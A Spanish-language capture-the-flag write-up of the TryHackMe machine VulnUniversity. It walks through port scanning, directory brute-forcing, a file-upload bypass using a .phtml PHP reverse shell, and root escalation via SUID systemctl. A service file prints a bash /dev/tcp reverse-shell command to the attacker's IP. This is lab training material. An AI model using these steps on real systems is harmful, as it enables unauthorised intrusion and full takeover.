---
layout: single
title: VulnUniversity - TryHackMe
excerpt: "En este caso debemos encontrar dos banderas ubicadas en la maquina VulnUniversity.Donde a partir del script `http-title.nse` de `Nmap` pude saber el titulo de la pagina web que se aloja en el servidor web. Luego, utilizo `wfuzz` para encontrar recursos ocultos a partir del directorio raiz del servidor web.Llegando a encontrar el recurso `internal` que viene a ser una pagina web que nos permite subir archivos al servidor web, que se almacenaran el directory list `uploads`. Luego, utilizamos `Burp Suite` para poder saber que extension debe tener el archivo para que nos permite la aplicacion web cargarlo al servidor web. Luego,explotamos la vulnerabilidad `File Upload` presente en la aplicacion web mediante un archivo con extension `PHMTL`. Llegando obtener acceso a la maquina VulnUniversity. Luego, realizamos una escalada de privilegios para ser el usuario root aprovechando que el archivo binario `systemctl` tiene el permiso `SUID` habilitado."
date: 2023-06-17
classes: wide
header:
  teaser: /assets/images/VulnUniversity/image003.png
  teaser_home_page: true
  icon: /assets/images/descarga7.webp
categories:
  - TryHackMe
  - ctf
tags:
  - Linux  
  - OpenVPN
  - Nmap
  - HTTP
  - Wfuzz
  - Bash
  - SSH
  - Systemctl
  - PHP
  - PHTML
  - Burp Suite
---

![](/assets/images/VulnUniversity/image001.png)

## Summary

En este caso debemos encontrar dos banderas ubicadas en la maquina VulnUniversity.Donde a partir del script `http-title.nse` de `Nmap` pude saber el titulo de la pagina web que se aloja en el servidor web. Luego, utilizo `wfuzz` para encontrar recursos ocultos a partir del directorio raiz del servidor web.Llegando a encontrar el recurso `internal` que viene a ser una pagina web que nos permite subir archivos al servidor web, que se almacenaran el directory list `uploads`. Luego, utilizamos `Burp Suite` para poder saber que extension debe tener el archivo para que nos permite la aplicacion web cargarlo al servidor web. Luego,explotamos la vulnerabilidad `File Upload` presente en la aplicacion web mediante un archivo con extension `PHMTL`. Llegando obtener acceso a la maquina VulnUniversity. Luego, realizamos una escalada de privilegios para ser el usuario root aprovechando que el archivo binario `systemctl` tiene el permiso `SUID` habilitado.

## Fase Reconocimiento

Para resolver este ejercicio empezaremos utilizando el comando `openvpn` con el fin de establecer una conexion VPN con la red virtual donde esta la maquina VulnUniversity.Para ello utilizaremos el archivo de configuracion, que lo podemos descargar en la plataforma de `Tryhackme`, que puede incluir informacion como la direccion del servidor VPN, los certificados y claves de seguridad, la configuracion de encriptacion, etc. 

![](/assets/images/VulnUniversity/image005.png)

Luego de que se establece la conexion VPN se crea una interfaz virtual de red en nuestra maquina. Donde se enruta todo el trafico de red a traves de esa interfaz.

![](/assets/images/VulnUniversity/image007.png)

Ademas, la plataforma de Tryhackme nos muestra la direccion de la maquina  VulnUniversity.

![](/assets/images/VulnUniversity/image009.png)

## Fase Escaneo y Enumeracion

Luego pasaremos a la fase de Escaneo y Enumeracion con el fin de poder escanear los puertos del nodo. Ademas, obtendremos los servicios que se han levantado en los puertos abiertos, las versiones de los servicios, y el posible sistema operativo de la maquina  VulnUniversity.Para ello utilizaremos `Nmap`.Donde le pasaremos los siguientes parametros:
- El parametro -sC o -script="default" para utilizar todos los scripts de la categoria default con el fin de realizar un escaneo y deteccion de los puertos de manera avanzada.
- El parametros -sV con el fin de conocer las versiones de los servicios levantados en los puertos abiertos.
- El parametro -n para evitar la resolucion DNS, y el parametro -min-rate para indicarle el numero de paquetes por segundo que va utilizar Nmap para el escaneo con el fin de evitar sobrecargar la red con el trafico generado por Nmap.
- El parametro -p- para realizar un escaneo de los 65535 puertos del nodo y el parametro -open con el fin de que nos muestre informacion solo de los puertos abiertos.

![](/assets/images/VulnUniversity/image011.png)

![](/assets/images/VulnUniversity/image013.png)

![](/assets/images/VulnUniversity/image015.png)

Los resultados que obtuvimos del escaneo vienen a ser:
- Hay un servicio `HTTP`, que se esta levantado en el puerto 3333, y el  programa servidor HTTP que se esta corriendo.Ademas, la version del programa servidor HTTP.
- Hay un servicio `SSH`, que se esta levantado en el puerto 22, y el  programa servidor SSH se esta corriendo.Ademas, la version del programa servidor SSH.
- Hay un servicio `FTP`, que esta levantado en el puerto 21, y el programa servidor FTP que se esta corriendo.Ademas, la version del programa servidor FTP.
- Hay un servicio `Proxy`, que esta levantado en el puerto 3128, y el programa servidor Proxy que se esta corriendo. Ademas, la version del program servidor Proxy.
- A partir del script `http-tittle.nse` de `Nmap` podimos obtener el titulo de una pagina HTML que se aloja en el servidor web de la maquina VulnUniversity.Este resultado tambien lo podimos haber obtenido al realizar una solicitud GET HTTP al servidor web con el comando curl para obtener el cuerpo de la respuesta HTML del servidor web

![](/assets/images/VulnUniversity/image017.png)

Observamos que el cuerpo de la respuesta `HTTP` viene a ser el codigo HTML de la pagina web.Donde en la etiqueta `title` podemos observar el titulo de la pagina HTML que se obtuvo del script `http-title.nse`.

Ahora accederemos a la pagina web a traves de mi navegador web para observar su contenido.

![](/assets/images/VulnUniversity/image019.png)

Ahora utilizaremos la herramienta `wfuzz`, que viene a ser una forma automatizada de descubrir CONTENT en un sitio o aplicacion web mediante fuerza bruta de directorios utilizando una lista de posibles nombres de directorios y archivos.
- El parametro -hc con el fin de filtrar los recursos que tenga un codigo de estado HTTP 403,404,400.
- El parametro -w con el fin de indicar la ruta de la lista de posibles nombres de archivos y directorios,que utilizara la herramienta.
- El parametro -u con el fin de indicar la ruta donde hara el ataque de fuerza bruta de directorios.

![](/assets/images/VulnUniversity/image021.png)

![](/assets/images/VulnUniversity/image023.png)

Llegamos a obtener dos recursos nuevos llamados `internal` y `fonts`. 
Ahora accederemos al recurso `fonts` a traves de mi navegador web para observar su contenido

![](/assets/images/VulnUniversity/image025.png)

Nos damos cuenta que el recurso `fonts` viene a ser un directory list que contiene archivos de configuracion utilizados en la aplicacion web.
Ahora accederemos al recurso `internal` a traves de mi navegador web para observar su contenido

![](/assets/images/VulnUniversity/image027.png)

Observamos que el recurso `internal` viene a ser una pagina web que nos permite cargar archivos al servidor web.

Ahora verificaremos si la aplicacion web presenta la vulnerabilidad `File Upload`, que nos permite cargar archivos con contenido malicioso para generar una conexion reverse shell hacia nuestra maquina. Para ello utilizaremos `Burp Suite`. Donde utilizaremos su servidor Proxy para coger una solicitud HTTP POST, luego mediante su ventana `Repeater` podremos observar las respuestas HTTP, que obtendremos del servidor web, al modificar la solicitud HTTP POST con diferentes extensiones php para poder cual extension permite la aplicacion web que podamos subir nuestro archivo al servidor web.

![](/assets/images/VulnUniversity/image029.png)

![](/assets/images/VulnUniversity/image031.png)

![](/assets/images/VulnUniversity/image033.png)

![](/assets/images/VulnUniversity/image035.png)

Observamos que cuando la solicitud HTTP POST contiene la extension `.phtml`, su respuesta HTML viene a contener el mensaje `Success`. Esto indica que la aplicacion web nos deja subir archivos con extension phtml. Por lo tanto, la aplicacion web si presenta la vulnerabilidad `File Upload` ya que no filtra o valida adecuadamente los archivos que suben los usuarios.

## Fase Hacking o Explotacion o Ganar Acceso

Ahora intentaremos subir un archivo `PHTML`, que viene a ser un archivo que contiene codigo `HTML` y `PHP`, pero en nuestro caso va contener un codigo `PHP` que generara una conexion reverse shell hacia nuestra maquina mediante el puerto 1500.

![](/assets/images/VulnUniversity/image037.png)

![](/assets/images/VulnUniversity/image039.png)

Llegamos a verificar que se ha subido nuestro archivo `PHTML`.
Ahora debemos encontrar la ruta de de nuestro archivo que hemos subido. Para ello realizaremos fuerza bruta de directorios desde la ruta del recurso `internal` para encontrar recursos escondidos, y utilizando `wfuzz`.

![](/assets/images/VulnUniversity/image041.png)

![](/assets/images/VulnUniversity/image043.png)

Ahora accederemos al recurso `uploads` a traves de mi navegador web para observar su contenido.

![](/assets/images/VulnUniversity/image045.png)

Podemos observar que viene a ser un directory list que contiene nuestro archivo que subimos anteriormente.
Ahora daremos clic al archivo `PHTML` para que se ejecute el codigo que tiene, pero antes habilitamos el puerto 1500 en nuestra maquina para que este en escucha y esperando la conexion entrante. Para ello utilizamos la herramienta `netcat`.Ademas, utilizamos el comando `rlwrap` para que la shell generada en nuestra maquina presenta funcionalidades como el autocompletado de comandos, historial de comandos, etc

![](/assets/images/VulnUniversity/image047.png)

Ahora daremos clic para que se ejecute el codigo del archivo `PHTML`, y nos genere la conexion reverse shell hacia nuestra maquina.

![](/assets/images/VulnUniversity/image049.png)

![](/assets/images/VulnUniversity/image051.png)

Nos damos cuenta que hemos obtenido acceso a la maquina VulnUniversity siendo el usuario www-data, y observando el contenido del archivo /etc/passwd nos percatamos que al usuario www-data se le he configurado una shell nologin que viene a ser una shell no interactiva para limitar al usuario en la ejecucion de ciertos comandos que requieren una tty. Por lo tanto, debemos buscar una vector de escalada de privilegios.

## Fase Escalada de Privilegios.
Ahora buscaremos archivos con permisos `SUID` o `SGID` con el fin de escalar privilegios, y llegar a ser el superusuario o root. Para ello ejecutamos el comando `find`, indicando que busque desde el directorio /, archivos con permisos SUID.

![](/assets/images/VulnUniversity/image053.png)

En esta ocasion utilizaremos el archivo binario `systemctl` para la escalada de privielgios.Ademas, debemos saber que a traves de este archivo binario podemos habilitar y iniciar servicios o aplicaciones en el sistema.
Teniendo en cuento esto se va crear un archivo con extension `service` que va ser utilizado para configurar y definir un servicio que al ejectuarse con `systemctl` me va generar una conexion reverse shelll hacia nuestra maquina, pero primero debemos saber en que directorios del sistema VulnUniversity tenemos el permiso de escribir, es decir, poder crear archivos.

![](/assets/images/VulnUniversity/image055.png)

En esta ocasion escogeremos el directorio `tmp` para crear nuestro archivo. 
Ahora crearemos las secciones y directivas que va contener nuestro archivo de servicio.

![](/assets/images/VulnUniversity/image057.png)

- En la seccion `[Unit]`, se especifica una descripcion para el servicio. En este caso, la descripcion es "root", que especifica el proposito o la funcion del servicio.
- En la seccion `[Service]`, se establecen las configuraciones relacionadas con el servicio mismo. Aqui estan las directivas utilizadas:
1. `Type=simple`: Esta directiva especifica que el servicio es un proceso simple y que no utiliza caracteristicas especiales de systemd.
2. `User=root`: Esta directiva indica que el servicio se ejecutara con el usuario "root".
3. `ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.123.194/1700 0>&1'`: Esta directiva establece el comando de inicio del servicio. En este caso, el comando nos generara una conexion reverse shell hacia nuestra maquina siendo el usuario root.
- La seccipn `[Install]` define como se debe activar el servicio durante el inicio del sistema. En este caso, se especifica que el servicio sera activado en el objetivo "multi-user.target", que es el objetivo predeterminado para sistemas multiusuario.

Ahora habilitaremos el servicio `root` que hemos creado. Luego, correremos el servicio root para que se nos genere la conexion reverse shell hacia nuestra maquina, pero antes debemos habilitar el puerto 1700 en nuestro sistema.

![](/assets/images/VulnUniversity/image059.png)

![](/assets/images/VulnUniversity/image061.png)

![](/assets/images/VulnUniversity/image063.png)

De esta manera llegamos a ser el usuario `root`.

Ahora buscaremos las dos banderas contenida en los archivos `user.txt` y `root.txt`. Para localizar los archivos utilizaremos el comando `find` para buscar desde el directorio /, archivos con nombre user.txt y root.txt.

![](/assets/images/VulnUniversity/image065.png)

![](/assets/images/VulnUniversity/image067.png)


